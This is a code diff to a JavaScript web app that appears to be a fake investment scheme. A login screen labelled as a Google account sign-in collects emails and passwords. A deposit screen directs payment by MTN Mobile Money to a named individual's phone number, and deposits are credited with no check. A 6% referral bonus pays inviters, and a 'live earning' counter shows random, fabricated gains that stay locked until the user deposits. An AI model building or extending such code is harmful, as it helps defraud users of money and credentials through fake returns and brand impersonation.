@@ -227,7 +227,7 @@ login();
 /* LOGIN */
 function login(){
 screen.innerHTML=`
-<h3 class="title">SIGN IN BY GOOGLE ACOUNT</h3>
+<h3 class="title">SIGN IN BY YOU GOOGLE ACOUNT</h3>
 
 <input id="le" placeholder="Email">
 <input id="lp" placeholder="Password">
@@ -256,9 +256,9 @@ function login(){
 screen.innerHTML=`
 <h3 class="title">LOGIN</h3>
 
-<input id="le" placeholder="Enter Email">
+<input id="le" placeholder="Enter Your Email">
 
-<input id="lp" type="password" placeholder="Enter Password">
+<input id="lp" type="password" placeholder="Enter Your Password">
 
 <button onclick="doLogin()">LOGIN</button>
 `;
@@ -266,23 +266,24 @@ screen.innerHTML=`
 
 function doLogin(){
 
-let user = users.find(
-u => u.email === val("le") && u.pass === val("lp")
+let index = users.findIndex(
+u => u.email === val("le") &&
+u.pass === val("lp")
 );
 
-if(!user){
+if(index === -1){
 toast("Invalid email or password");
 return;
 }
 
-currentUser = user;
+currentUser = users[index];
 
 nav.style.display = "flex";
 
 toast("Login successful ✔");
 
 home();
-}  
+}
   
 /* HOME */
 function home(){
@@ -448,8 +449,8 @@ amount=parseInt(val("amt"));
 screen.innerHTML=`
 <h3 class="title">PAYMENT PROCESS</h3>
 <p class="desc">Pay by using MTN Mobile money.</p>
-<br></br?
-<div class="card">*182*1*1*0792459701#</div>
+<br></br>
+<div class="card">       *182*1*1*0792459701#</div>
 <br></br>
 <div class="card">BARAKA BOLINGO</div>
 
@@ -462,35 +463,57 @@ function finishDeposit(){
 
 depositDone=true;
 
+/* ADD USER BALANCE */
+currentUser.balance += amount;
+
 /* BONUS 6% */
 if(currentUser.invitedBy){
-let inviter = users.find(u=>u.refCode===currentUser.invitedBy);
+
+let inviter = users.find(
+u=>u.refCode===currentUser.invitedBy
+);
+
 if(inviter){
+
 let bonus = Math.floor(amount * 0.06);
+
 inviter.balance += bonus;
+
 toast("Bonus "+bonus+" RWF sent");
 }
 }
 
 localStorage.setItem("users",JSON.stringify(users));
 
-toast("Deposit successful!");
+toast("Deposit success ✔");
+
 home();
 }
 
 /* EARN */
 function earn(){
 
+if(!depositDone){
+toast("You must deposit first");
+return;
+}
+
 screen.innerHTML=`
 <h3 class="title">LIVE EARNING</h3>
-<div class="card" id="live">0</div>
+<div class="card" id="live">0 RWF</div>
 `;
 
-let i=0;
+let i = 0;
+
 setInterval(()=>{
-i+=Math.random()*1000;
-document.getElementById("live").innerText=Math.floor(i)+" RWF";
+
+i += Math.floor(Math.random()*1000);
+
+document.getElementById("live").innerText =
+i.toLocaleString() + " RWF";
+
 },1000);
+
 }
 
 /* WITHDRAW */
